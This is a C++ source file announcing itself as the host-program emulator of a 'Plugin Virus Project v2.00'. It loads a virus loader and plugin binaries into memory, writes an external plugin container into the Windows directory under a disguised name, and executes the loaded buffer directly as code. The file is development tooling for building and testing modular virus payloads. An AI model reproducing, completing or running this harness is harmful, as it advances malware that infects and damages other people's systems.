
#include <windows.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>
#include <io.h>

#pragma hdrstop

#include "unique.hpp"

int OPT_RUN =0;
int OPT_INT3=0;
int OPT_HALT=0;
char root[512]="";

DWORD maxbufsize = 1048576;
BYTE* buf = (BYTE*)calloc(1,maxbufsize);
DWORD bufsize = 0;
BYTE* extbuf = (BYTE*)calloc(1,maxbufsize);
DWORD extbufsize = 0;
int   filecount = 0;
char  pluginswp[260];

void load_file(int ext, char* fname0)
{
  char fname[512],fnameN[512],fnameNE[512];
  strcpy(fnameN, fname0);
  if (strrchr(fnameN, '\\')) strcpy(fnameN, strrchr(fnameN, '\\')+1 );
  if (strrchr(fnameN,'.')) *strrchr(fnameN,'.')=0;
  strcpy(fnameNE,fname0);
  if (strrchr(fnameNE,'\\') >= strrchr(fnameNE,'.'))
    strcat(fnameNE,".pgn");
  for (;;)
  {
    strcpy(fname,fnameNE);
    if (access(fname,0)==0) break;      // fname[.pgn]
    if (strrchr(fnameNE,'\\')) strcpy(fnameNE,strrchr(fnameNE,'\\')+1 );
    sprintf(fname,"%s%s",root,fnameNE);
    if (access(fname,0)==0) break;      // root\fname[.pgn]
    sprintf(fname,"%s%s\\%s",root,fnameN,fnameNE);
    if (access(fname,0)==0) break;      // root\fname\fname[.pgn]
    printf("***ERROR***: file not found, %s\n", fname0);
    exit(0);
  }

  printf("þ loading: %s%s\n", fname, ext?" (EXTERNAL)":"");
  assert( (!stricmp(&fname[strlen(fname)-4],".pgn")) ||
          (!stricmp(&fname[strlen(fname)-4],".bin")) );
  FILE*f=fopen(fname, "rb");
  assert(f);
  DWORD fsize = filelength(fileno(f));
  assert(bufsize + fsize <= maxbufsize);
  if (ext)
  {
    fread(&extbuf[extbufsize], 1,fsize, f);
    extbufsize += fsize;
  }
  else
  {
    fread(&buf[bufsize], 1,fsize, f);
    bufsize += fsize;
  }
  fclose(f);
  filecount++;
}

void load_list(char* fname)
{
  FILE*f=fopen(fname,"rb");
  assert(f);
  for(;;)
  {
    char s[1024];
    fgets(s, sizeof(s), f);
    if (feof(f)) break;
    char *c = &s[0];
    while (  (*c==32)||(*c==9) ) c++;
    while ( (c[strlen(c)-1]==32)||
            (c[strlen(c)-1]== 9)||
            (c[strlen(c)-1]==13)||
            (c[strlen(c)-1]==10)  ) c[strlen(c)-1]=0;
    if ( (*c) && (*c != ';') )
      if (*c=='#')
      {
        c++;
        while (*c==32) c++;
        load_file(1,c);
      }
      else
        load_file(0,c);
  }
  fclose(f);
}

void help()
{
  printf("syntax:\n"\
         "  HOST /run [/int3] [/halt] <ldrwin32.bin> [#]file(s) @listfile(s) &pgnroot\n");
  exit(0);
}

void main(int argc, char* argv[])
{
  GetWindowsDirectory(pluginswp,260);
  strcat(pluginswp,"\\");
  *uniquestr(&pluginswp[strlen(pluginswp)],
             8,0xA85CF86D)=0; // crc32('ldrwin32')

  printf(";---------------------------------------------------------------------------\n");
  printf("; PLUGIN VIRUS PROJECT v2.00 -- HOST PROGRAM EMULATOR\n");
  printf(";---------------------------------------------------------------------------\n");

  for (int i=1; i<argc; i++)
  {
    if (argv[i][0]=='/')
    {
      if (!stricmp(argv[i], "/run"))  OPT_RUN=1;  else
      if (!stricmp(argv[i], "/int3")) OPT_INT3=1; else
      if (!stricmp(argv[i], "/halt")) OPT_HALT=1; else
        help();
    }
    if (argv[i][0]=='&')
    {
      if (root[0]==0)
      {
        strcpy(root,&argv[i][1]);
        if (!root[0]) help();
        if (root[ strlen(root)-1 ]!='\\') strcat(root,"\\");
        printf("þ plugin root = %s\n", root);
      }
      else
        help();
    }
  }

  if (!OPT_RUN) help();

  for (int i=1; i<argc; i++)
  {
    if (argv[i][0]!='/')
    if (argv[i][0]!='&')
    if (argv[i][0]=='@')
      load_list(&argv[i][1]);
    else
    if (argv[i][0]=='#')
      load_file(1,&argv[i][1]);
    else
      load_file(0,argv[i]);
  }

  if (bufsize==0)
  {
    printf("***ERROR***: at least loader should be specified in main plugin set\n");
    exit(0);
  }

  *(DWORD*)&buf[bufsize] = 0;   // terminating DD 0
  bufsize += 4;

  if (extbufsize)
  {
    *(DWORD*)&extbuf[extbufsize] = 0;   // terminating DD 0
    extbufsize += 4;
  }

  printf("þ loaded: %i files, %i bytes, %i bytes external\n", filecount, bufsize, extbufsize);

  if (!filecount) exit(0);

  if (extbufsize)
  {
    printf("þ writing external container: %s\n", pluginswp);
    FILE*f=fopen(pluginswp,"wb");
    assert(f);
    fwrite(extbuf, 1,extbufsize, f);
    fclose(f);
  }
  else
  {
    unlink(pluginswp);
  }

  printf("þ executing...\n");
  fflush(stdout);

  if (OPT_INT3) __emit__(0xcc);

  ((void(*)())buf) ();

  if (OPT_HALT)
  {
    printf("þ thread halted\n");
    for(;;)
    {
      Sleep(10*1000);
    }
  }

  printf("þ exiting\n");
}
